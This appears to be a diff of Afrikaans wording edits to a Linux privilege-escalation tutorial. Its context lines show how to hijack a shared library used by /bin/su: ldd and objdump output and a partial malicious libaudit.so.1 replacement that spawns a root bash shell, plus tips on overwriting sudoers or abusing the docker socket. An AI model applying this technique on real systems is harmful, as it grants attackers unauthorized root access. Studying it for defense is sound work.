@@ -44,7 +44,7 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Oorskryf van 'n lêer om voorregte te eskaleer
+## Oorskryf van 'n lêer om privileges te eskaleer
 
 ### Algemene lêers
 
@@ -53,9 +53,9 @@ return 0;
 - Voeg gebruiker by sudoers in _/etc/sudoers_
 - Misbruik docker deur die docker socket, gewoonlik in _/run/docker.sock_ of _/var/run/docker.sock_
 
-### Oorskryf van 'n library
+### Oorskryf van 'n biblioteek
 
-Kontroleer 'n library wat deur een of ander binary gebruik word, in hierdie geval `/bin/su`:
+Kontroleer 'n biblioteek wat deur 'n binary gebruik word, in hierdie geval `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -67,7 +67,7 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-In hierdie geval probeer ons om `/lib/x86_64-linux-gnu/libaudit.so.1` na te boots.\
+In hierdie geval kom ons probeer om `/lib/x86_64-linux-gnu/libaudit.so.1` na te boots.\
 Kontroleer dus vir funksies van hierdie library wat deur die **`su`**-binary gebruik word:
 ```bash
 objdump -T /bin/su | grep audit
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Die simbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` en `audit_fd` is waarskynlik afkomstig van die libaudit.so.1-biblioteek. Aangesien die libaudit.so.1 deur die kwaadwillige shared library oorskryf sal word, moet hierdie simbole in die nuwe shared library teenwoordig wees; anders sal die program nie die simbool kan vind nie en afsluit.
+Die simbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` en `audit_fd` is waarskynlik afkomstig van die libaudit.so.1-biblioteek. Aangesien libaudit.so.1 deur die kwaadwillige shared library oorskryf sal word, moet hierdie simbole in die nuwe shared library teenwoordig wees; andersins sal die program nie die simbool kan vind nie en afsluit.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,7 +98,7 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Nou, deur bloot **`/bin/su`** aan te roep, sal jy ’n shell as root verkry.
+Nou, deur net **`/bin/su`** aan te roep, sal jy ’n shell as root verkry.
 
 ## Skripte
 
